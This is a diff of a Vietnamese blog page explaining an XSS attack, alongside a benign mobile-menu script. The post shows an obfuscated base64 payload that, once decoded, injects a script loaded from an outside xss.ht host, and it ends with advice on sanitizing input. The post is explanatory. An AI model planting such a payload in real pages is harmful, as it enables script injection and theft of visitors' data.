@@ -36,13 +36,23 @@
                     <div class="logo">
                         <a href="../">AhaXu</a>
                     </div>
-                    <nav class="main-nav">
-                        <a href="../" class="nav-link">Home</a>
-                        <a href="../about.html" class="nav-link">About</a>
-                        <a href="../tags/thơ%20thẩn.html" class="nav-link">Poetry</a>
-                        <a href="../archive.html" class="nav-link">Archive</a>
-                    </nav>
+                    <button class="mobile-menu-toggle" id="mobile-menu-toggle" aria-label="Toggle mobile menu" aria-expanded="false" aria-controls="main-nav" aria-haspopup="true" type="button">
+                        <span class="sr-only">Menu</span>
+                        <span aria-hidden="true"></span>
+                        <span aria-hidden="true"></span>
+                        <span aria-hidden="true"></span>
+                    </button>
                 </div>
+                
+                <nav class="main-nav" id="main-nav" role="navigation" aria-label="Main navigation">
+                    <button class="nav-close-btn" id="nav-close-btn" aria-label="Close navigation menu" type="button">
+                        <span aria-hidden="true">&times;</span>
+                    </button>
+                    <a href="../" class="nav-link">Home</a>
+                    <a href="../about.html" class="nav-link">About</a>
+                    <a href="../tags/thơ%20thẩn.html" class="nav-link">Poetry</a>
+                    <a href="../archive.html" class="nav-link">Archive</a>
+                </nav>
             </div>
         </header>
 
@@ -53,19 +63,15 @@
                         <header class="post-header">
                             <h1 class="post-title">(Vi) XSS attack sample</h1>
                         </header>
-                        <div class="info">
-    Posted on November 17, 2022
+                        <div class="post-meta">
+    <time class="post-date" datetime="November 17, 2022">November 17, 2022</time>
     
-        by lk
-    
-</div>
-<div class="info">
-    
-    Tags: <a title="All pages tagged 'security'." href="../tags/security.html" rel="tag">security</a>
+        <span class="post-author">by lk</span>
     
 </div>
 
-<p>Disclaimer: Kỹ thuật này có thể đã lạc hậu tại thời điểm bài này đuợc viết ;). Enjoy your day lah ^^.</p>
+<div class="post-body">
+    <p>Disclaimer: Kỹ thuật này có thể đã lạc hậu tại thời điểm bài này đuợc viết ;). Enjoy your day lah ^^.</p>
 <p><strong>XSS attack là kỹ thuật tấn công khá phổ biến bên cạnh SQL injection. Hãy cùng xem thử một ví dụ mà attacker inject thành công một đọan mã độc vào hệ thống nhé!</strong></p>
 <p>Đầu tiên, hãy chạy đoạn thử js này trong js console</p>
 <div class="sourceCode" id="cb1"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> <span class="fu">atob</span>(<span class="st">'dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZDB4NS54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7'</span>)</span>
@@ -101,6 +107,7 @@ gửi về cho attacker trong hàm bên dưới</p>
 <p><strong>Hãy luôn sanitize input data có kiểu string ;) và kỹ hơn nữa thì nên sanitize data load từ database khi render html page.</strong>
 Hoặc nên dùng các thư viện ORM có hỗ trợ việc sanitize/ cast các malicious input data này.</p>
 <p>Nếu bạn còn tò mò, hãy vọc vạch thêm từ đây https://xsshunter.com/</p>
+</div>
 
                     </article>
                 
@@ -112,5 +119,122 @@ Hoặc nên dùng các thư viện ORM có hỗ trợ việc sanitize/ cast các
                 <p>&copy; 2025 AhaXu - Built with Hakyll</p>
             </div>
         </footer>
+
+        <script>
+            // Mobile menu functionality with accessibility improvements
+            document.addEventListener('DOMContentLoaded', function() {
+                const mobileMenuToggle = document.getElementById('mobile-menu-toggle');
+                const mainNav = document.getElementById('main-nav');
+                const navLinks = document.querySelectorAll('.nav-link');
+                const navCloseBtn = document.getElementById('nav-close-btn');
+                let isMenuOpen = false;
+                
+                // Focus trap for mobile menu
+                function trapFocus(element) {
+                    const focusableElements = element.querySelectorAll(
+                        'a[href], button, textarea, input[type="text"], input[type="radio"], input[type="checkbox"], select'
+                    );
+                    const firstFocusableElement = focusableElements[0];
+                    const lastFocusableElement = focusableElements[focusableElements.length - 1];
+                    
+                    element.addEventListener('keydown', function(e) {
+                        if (e.key === 'Tab') {
+                            if (e.shiftKey) {
+                                if (document.activeElement === firstFocusableElement) {
+                                    e.preventDefault();
+                                    lastFocusableElement.focus();
+                                }
+                            } else {
+                                if (document.activeElement === lastFocusableElement) {
+                                    e.preventDefault();
+                                    firstFocusableElement.focus();
+                                }
+                            }
+                        }
+                    });
+                }
+                
+                // Toggle menu function
+                function toggleMenu() {
+                    isMenuOpen = !isMenuOpen;
+                    
+                    if (isMenuOpen) {
+                        mainNav.classList.add('active');
+                        mobileMenuToggle.classList.add('active');
+                        mobileMenuToggle.setAttribute('aria-expanded', 'true');
+                        mainNav.setAttribute('aria-hidden', 'false');
+                        
+                        // Focus first navigation link
+                        const firstLink = mainNav.querySelector('.nav-link');
+                        if (firstLink) {
+                            firstLink.focus();
+                        }
+                        
+                        // Add focus trap
+                        trapFocus(mainNav);
+                        
+                        // Prevent body scroll
+                        document.body.style.overflow = 'hidden';
+                    } else {
+                        closeMenu();
+                    }
+                }
+                
+                // Close menu function
+                function closeMenu() {
+                    isMenuOpen = false;
+                    mainNav.classList.remove('active');
+                    mobileMenuToggle.classList.remove('active');
+                    mobileMenuToggle.setAttribute('aria-expanded', 'false');
+                    mainNav.setAttribute('aria-hidden', 'true');
+                    
+                    // Return focus to toggle button
+                    mobileMenuToggle.focus();
+                    
+                    // Restore body scroll
+                    document.body.style.overflow = '';
+                }
+                
+                // Event listeners
+                mobileMenuToggle.addEventListener('click', toggleMenu);
+                
+                // Keyboard support for toggle button
+                mobileMenuToggle.addEventListener('keydown', function(e) {
+                    if (e.key === 'Enter' || e.key === ' ') {
+                        e.preventDefault();
+                        toggleMenu();
+                    }
+                });
+                
+                // Close menu when clicking on a link
+                navLinks.forEach(link => {
+                    link.addEventListener('click', closeMenu);
+                });
+
+                // Close menu when clicking on the close button
+                navCloseBtn.addEventListener('click', closeMenu);
+                
+                // Close menu when clicking outside
+                document.addEventListener('click', function(event) {
+                    if (isMenuOpen && !mobileMenuToggle.contains(event.target) && !mainNav.contains(event.target) && (!navCloseBtn || !navCloseBtn.contains(event.target))) {
+                        closeMenu();
+                    }
+                });
+                
+                // Close menu on Escape key
+                document.addEventListener('keydown', function(e) {
+                    if (e.key === 'Escape' && isMenuOpen) {
+                        closeMenu();
+                    }
+                });
+                
+                // Handle window resize
+                window.addEventListener('resize', function() {
+                    if (window.innerWidth > 768 && isMenuOpen) {
+                        closeMenu();
+                    }
+                });
+            });
+        </script>
     </body>
 </html>
